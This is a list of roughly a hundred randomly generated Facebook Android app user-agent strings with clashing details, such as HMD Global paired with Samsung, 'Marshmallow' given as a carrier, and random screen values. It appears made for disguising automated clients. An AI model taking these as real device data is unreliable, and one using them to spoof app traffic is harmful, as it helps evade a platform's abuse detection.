"[FBAN/FB4A;FBAV/16.0.0.36.41;FBBV/12987850;FBDM/{density=4.8,width=1334,height=1842};FBLC/en_GB;FBRV/80410682;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J337R4;FBSV/9.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/249.0.0.58.150;FBBV/48367728;FBDM/{density=2.7,width=1326,height=2170};FBLC/en_GB;FBRV/67310893;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G720AX;FBSV/9.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/292.0.0.56.101;FBBV/62630480;FBDM/{density=9.3,width=688,height=1609};FBLC/en_PK;FBRV/38800435;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J106H;FBSV/8.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/48.0.0.31.151;FBBV/71227045;FBDM/{density=8.8,width=586,height=2946};FBLC/en_PK;FBRV/74243711;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N986U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/410.0.0.7.24;FBBV/63204981;FBDM/{density=9.2,width=967,height=2520};FBLC/en_US;FBRV/61446913;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J600F;FBSV/6.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/113.0.0.19.108;FBBV/16633875;FBDM/{density=9.9,width=1294,height=1199};FBLC/en_PK;FBRV/16514122;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N981B;FBSV/9.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/261.0.0.32.78;FBBV/74101934;FBDM/{density=3.4,width=1266,height=2066};FBLC/en_US;FBRV/77986860;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung F9000;FBSV/9.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/58.0.0.48.162;FBBV/77972160;FBDM/{density=3.8,width=512,height=1060};FBLC/en_GB;FBRV/36541925;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A307GN;FBSV/7.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/386.0.0.22.102;FBBV/83481947;FBDM/{density=5.2,width=921,height=2405};FBLC/en_PK;FBRV/77494740;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J100FN;FBSV/9.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/338.0.0.75.79;FBBV/84425329;FBDM/{density=9.7,width=1286,height=2687};FBLC/en_GB;FBRV/89940316;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung S908U;FBSV/7.0;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/149.0.0.65.198;FBBV/16812916;FBDM/{density=3.3,width=1126,height=2704};FBLC/en_US;FBRV/84712749;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G720N0;FBSV/7;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/315.0.0.19.1;FBBV/57460005;FBDM/{density=1.8,width=1401,height=2655};FBLC/en_US;FBRV/33303621;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung M105G;FBSV/8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/381.0.0.7.192;FBBV/19538509;FBDM/{density=7.5,width=573,height=1505};FBLC/en_GB;FBRV/80314409;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J3119;FBSV/7.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/93.0.0.7.81;FBBV/40101381;FBDM/{density=2.1,width=1229,height=2113};FBLC/en_GB;FBRV/35429136;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung M307FN;FBSV/8.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/162.0.0.51.1;FBBV/89585200;FBDM/{density=6.5,width=898,height=1336};FBLC/en_US;FBRV/36527118;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J106M;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/373.0.0.86.31;FBBV/16807923;FBDM/{density=9.9,width=1101,height=2928};FBLC/en_GB;FBRV/73617578;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J320A;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/94.0.0.52.107;FBBV/21173481;FBDM/{density=3.2,width=644,height=2807};FBLC/en_GB;FBRV/24215703;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G981U;FBSV/8.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/258.0.0.79.104;FBBV/54323498;FBDM/{density=2.7,width=822,height=2125};FBLC/en_GB;FBRV/90338738;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A025F;FBSV/9.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/231.0.0.91.187;FBBV/21671437;FBDM/{density=3.8,width=1245,height=1158};FBLC/en_US;FBRV/86759588;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N970U;FBSV/7.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/25.0.0.89.59;FBBV/83601063;FBDM/{density=1.3,width=880,height=1423};FBLC/en_GB;FBRV/44918074;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N750L;FBSV/6.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/252.0.0.25.175;FBBV/33253401;FBDM/{density=5.7,width=1464,height=2277};FBLC/en_US;FBRV/94740410;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A516N;FBSV/7.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/211.0.0.98.18;FBBV/84259378;FBDM/{density=6.3,width=698,height=2728};FBLC/en_US;FBRV/34334440;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G350E;FBSV/7.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/210.0.0.73.198;FBBV/84536993;FBDM/{density=1.9,width=1066,height=1152};FBLC/en_PK;FBRV/21888844;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J330FN;FBSV/6.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/118.0.0.49.3;FBBV/13907259;FBDM/{density=6.1,width=952,height=2922};FBLC/en_PK;FBRV/57434634;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung F127G;FBSV/9.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/425.0.0.30.107;FBBV/81253703;FBDM/{density=8.3,width=980,height=1671};FBLC/en_PK;FBRV/48096156;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J106F;FBSV/7.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/111.0.0.36.140;FBBV/57817862;FBDM/{density=5.3,width=1026,height=1267};FBLC/en_US;FBRV/11165514;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N930T;FBSV/7.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/98.0.0.74.28;FBBV/23418554;FBDM/{density=3.1,width=937,height=1811};FBLC/en_US;FBRV/55319216;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G550T;FBSV/8.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/216.0.0.6.72;FBBV/90054895;FBDM/{density=5.6,width=728,height=1131};FBLC/en_GB;FBRV/12691334;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A025U;FBSV/8.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/402.0.0.6.42;FBBV/77429172;FBDM/{density=8.3,width=1220,height=1490};FBLC/en_GB;FBRV/69344944;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G991B;FBSV/7.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/209.0.0.89.99;FBBV/55941728;FBDM/{density=9.9,width=905,height=1827};FBLC/en_US;FBRV/18904501;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A300FU;FBSV/7.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/323.0.0.47.56;FBBV/50328894;FBDM/{density=6.4,width=647,height=2341};FBLC/en_PK;FBRV/73923350;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G781B;FBSV/8.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/300.0.0.78.181;FBBV/55430341;FBDM/{density=8.9,width=1486,height=1167};FBLC/en_PK;FBRV/95883712;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G930P;FBSV/8.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/100.0.0.46.193;FBBV/48406839;FBDM/{density=1.7,width=841,height=1621};FBLC/en_PK;FBRV/75219236;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G998U;FBSV/7.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/178.0.0.30.99;FBBV/92003467;FBDM/{density=5.9,width=559,height=1438};FBLC/en_US;FBRV/94864411;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A260G;FBSV/8.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/193.0.0.88.50;FBBV/70793419;FBDM/{density=9.1,width=621,height=2862};FBLC/en_US;FBRV/80511091;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N970U;FBSV/6.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/310.0.0.62.193;FBBV/29571134;FBDM/{density=4.7,width=1389,height=1015};FBLC/en_PK;FBRV/25309561;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A606Y;FBSV/9.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/416.0.0.76.190;FBBV/31699128;FBDM/{density=6.8,width=572,height=1630};FBLC/en_PK;FBRV/39129006;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung F127G;FBSV/7.7;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/79.0.0.24.200;FBBV/66939305;FBDM/{density=3.9,width=1059,height=1208};FBLC/en_PK;FBRV/16576330;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G600F;FBSV/7.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/425.0.0.97.45;FBBV/69505718;FBDM/{density=1.9,width=609,height=2724};FBLC/en_US;FBRV/12981950;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung S9080;FBSV/8.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/242.0.0.35.83;FBBV/32503833;FBDM/{density=4.2,width=1346,height=2915};FBLC/en_PK;FBRV/77992536;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung C701F;FBSV/8.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/132.0.0.4.186;FBBV/45449027;FBDM/{density=3.6,width=1090,height=1174};FBLC/en_GB;FBRV/55900803;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G310HN;FBSV/7;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/31.0.0.25.82;FBBV/62485663;FBDM/{density=3.6,width=1280,height=1851};FBLC/en_GB;FBRV/73378073;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J110M;FBSV/8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/304.0.0.89.92;FBBV/57088412;FBDM/{density=3.2,width=1458,height=2662};FBLC/en_US;FBRV/33584571;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J120FN;FBSV/8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/19.0.0.69.72;FBBV/45918069;FBDM/{density=5.4,width=590,height=2911};FBLC/en_US;FBRV/22551882;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J200GU;FBSV/7.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/258.0.0.18.57;FBBV/70014906;FBDM/{density=3.4,width=1243,height=2845};FBLC/en_PK;FBRV/80527360;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A013G;FBSV/7.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/121.0.0.57.197;FBBV/38994915;FBDM/{density=2.3,width=617,height=2950};FBLC/en_US;FBRV/89238954;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung M105F;FBSV/9.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/162.0.0.70.4;FBBV/31104971;FBDM/{density=9.8,width=1336,height=1908};FBLC/en_PK;FBRV/82092332;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G930P;FBSV/8.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/389.0.0.33.57;FBBV/20345798;FBDM/{density=4.9,width=908,height=2161};FBLC/en_US;FBRV/99244887;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G532M;FBSV/9.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/424.0.0.51.49;FBBV/55422943;FBDM/{density=6.8,width=944,height=2548};FBLC/en_GB;FBRV/36855262;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J720M;FBSV/6.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/168.0.0.95.109;FBBV/37720614;FBDM/{density=8.5,width=1356,height=1179};FBLC/en_US;FBRV/76807006;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N935K;FBSV/9.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/28.0.0.61.51;FBBV/27352608;FBDM/{density=3.8,width=575,height=1836};FBLC/en_GB;FBRV/93680098;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G950U;FBSV/7.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/79.0.0.35.46;FBBV/30736995;FBDM/{density=1.6,width=1136,height=1724};FBLC/en_PK;FBRV/37810953;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A500L;FBSV/9.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/306.0.0.42.76;FBBV/17391035;FBDM/{density=7.1,width=1373,height=2070};FBLC/en_GB;FBRV/58919084;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A525F;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/398.0.0.63.185;FBBV/55036677;FBDM/{density=7.1,width=702,height=2350};FBLC/en_GB;FBRV/80204130;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J337R4;FBSV/8.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/424.0.0.38.173;FBBV/95257496;FBDM/{density=9.7,width=1124,height=2383};FBLC/en_US;FBRV/89490678;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G920P;FBSV/6.0;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/181.0.0.77.112;FBBV/75309488;FBDM/{density=4.6,width=1218,height=2351};FBLC/en_GB;FBRV/51639455;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G920T;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/365.0.0.86.165;FBBV/55855028;FBDM/{density=7.2,width=672,height=2606};FBLC/en_GB;FBRV/86688831;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G357FZ;FBSV/6.0;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/240.0.0.72.190;FBBV/53934815;FBDM/{density=8.3,width=806,height=2194};FBLC/en_US;FBRV/30425600;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N930x;FBSV/7.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/248.0.0.30.145;FBBV/65229827;FBDM/{density=9.5,width=1045,height=1741};FBLC/en_US;FBRV/13862248;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A136U1;FBSV/9.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/87.0.0.83.93;FBBV/14360861;FBDM/{density=5.5,width=794,height=1223};FBLC/en_US;FBRV/27095924;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J810G;FBSV/7.0;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/85.0.0.66.64;FBBV/89764934;FBDM/{density=3.1,width=1127,height=1896};FBLC/en_US;FBRV/85555861;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J200GU;FBSV/8.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/176.0.0.11.69;FBBV/41534349;FBDM/{density=3.9,width=953,height=1254};FBLC/en_US;FBRV/64555352;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J327T1;FBSV/7.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/193.0.0.9.148;FBBV/44016781;FBDM/{density=3.4,width=1297,height=2498};FBLC/en_PK;FBRV/30750361;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G781U;FBSV/6.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/185.0.0.21.182;FBBV/36368499;FBDM/{density=2.1,width=960,height=2534};FBLC/en_PK;FBRV/14389367;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung F900U;FBSV/13;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/226.0.0.38.83;FBBV/97155047;FBDM/{density=6.1,width=656,height=1688};FBLC/en_PK;FBRV/13177744;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J260F;FBSV/9.0;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/207.0.0.98.58;FBBV/90415183;FBDM/{density=6.8,width=1192,height=2489};FBLC/en_US;FBRV/52464269;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G7105;FBSV/7.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/298.0.0.62.102;FBBV/66589366;FBDM/{density=4.2,width=667,height=1279};FBLC/en_PK;FBRV/78203704;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A102U;FBSV/7.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/237.0.0.35.147;FBBV/22724909;FBDM/{density=1.3,width=1069,height=1336};FBLC/en_GB;FBRV/93606229;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J700P;FBSV/6.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/247.0.0.44.189;FBBV/75348424;FBDM/{density=8.6,width=1192,height=1542};FBLC/en_PK;FBRV/54674874;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J530Y;FBSV/9.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/46.0.0.45.33;FBBV/86301860;FBDM/{density=7.3,width=1400,height=2065};FBLC/en_PK;FBRV/72284596;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J737P;FBSV/8.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/179.0.0.39.51;FBBV/87575398;FBDM/{density=2.6,width=1416,height=2217};FBLC/en_PK;FBRV/81341949;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J727T1;FBSV/9.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/196.0.0.1.55;FBBV/22626443;FBDM/{density=2.2,width=872,height=1457};FBLC/en_GB;FBRV/58336408;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung M625F;FBSV/7.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/24.0.0.30.158;FBBV/75585219;FBDM/{density=6.4,width=653,height=2359};FBLC/en_US;FBRV/57101298;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung S757BL;FBSV/7.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/254.0.0.64.158;FBBV/22220971;FBDM/{density=5.2,width=1428,height=1330};FBLC/en_US;FBRV/28408762;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A530F;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/265.0.0.52.12;FBBV/68936415;FBDM/{density=1.1,width=905,height=1376};FBLC/en_PK;FBRV/99177457;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G610F;FBSV/6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/405.0.0.84.78;FBBV/23630834;FBDM/{density=5.3,width=581,height=1620};FBLC/en_US;FBRV/30888142;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J727P;FBSV/6.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/209.0.0.38.1;FBBV/93034076;FBDM/{density=5.2,width=813,height=2496};FBLC/en_GB;FBRV/55415907;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung E135F;FBSV/8.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/387.0.0.29.64;FBBV/55454049;FBDM/{density=4.1,width=877,height=1973};FBLC/en_PK;FBRV/43928553;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G9650;FBSV/8.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/256.0.0.36.14;FBBV/98587574;FBDM/{density=7.5,width=699,height=2975};FBLC/en_PK;FBRV/45393331;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A500F;FBSV/9.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/189.0.0.16.38;FBBV/47459368;FBDM/{density=5.2,width=1312,height=1369};FBLC/en_GB;FBRV/76298170;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung M135F;FBSV/6.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/261.0.0.54.111;FBBV/91302578;FBDM/{density=8.6,width=976,height=1252};FBLC/en_US;FBRV/93593883;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A205G;FBSV/7.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/369.0.0.34.13;FBBV/24975239;FBDM/{density=2.3,width=1280,height=1853};FBLC/en_PK;FBRV/21755429;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A305F;FBSV/6.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/294.0.0.66.163;FBBV/19845326;FBDM/{density=5.7,width=1084,height=2517};FBLC/en_US;FBRV/53981462;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G360H;FBSV/9.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/128.0.0.42.79;FBBV/32871044;FBDM/{density=7.4,width=878,height=1107};FBLC/en_US;FBRV/41891243;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung S906U;FBSV/7.7;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/278.0.0.84.126;FBBV/62396371;FBDM/{density=5.9,width=862,height=1151};FBLC/en_US;FBRV/92049242;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G900F;FBSV/6.0;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/408.0.0.80.158;FBBV/69453623;FBDM/{density=7.4,width=1443,height=1558};FBLC/en_US;FBRV/69409498;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A226B;FBSV/9.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/90.0.0.8.4;FBBV/27587726;FBDM/{density=5.3,width=981,height=1356};FBLC/en_GB;FBRV/84876751;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A037U;FBSV/8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/226.0.0.48.175;FBBV/32908497;FBDM/{density=6.6,width=782,height=2479};FBLC/en_US;FBRV/35365035;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G986U;FBSV/6.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/131.0.0.92.16;FBBV/17605272;FBDM/{density=8.8,width=533,height=2084};FBLC/en_PK;FBRV/74783589;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G110M;FBSV/6.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/365.0.0.14.14;FBBV/20812443;FBDM/{density=6.3,width=1053,height=2357};FBLC/en_GB;FBRV/66922449;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G531BT;FBSV/7.9;FBOP/1;FBCA/arm64-v8a:;]"
